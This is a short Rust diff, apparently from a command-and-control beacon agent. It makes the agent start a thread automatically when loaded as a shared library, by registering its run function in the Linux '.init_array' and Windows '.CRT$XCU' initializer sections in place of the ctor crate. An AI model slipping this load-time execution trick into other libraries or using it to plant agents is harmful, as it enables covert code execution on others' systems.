@@ -161,8 +161,13 @@ fn run_beacon() -> Result<(), Box<dyn Error>> {
     Ok(())
 }
 
+#[cfg(crate_type = "cdylib")]
+#[used]
+#[cfg_attr(target_os = "linux", link_section = ".init_array")]
+#[cfg_attr(target_os = "windows", link_section = ".CRT$XCU")]
+static INIT: fn() = run;
+
 /// Run the agent in a new thread (if loading from a shared library)
-#[ctor::ctor]
 #[cfg(crate_type = "cdylib")]
 fn run() {
     std::thread::spawn(|| real_main().unwrap());
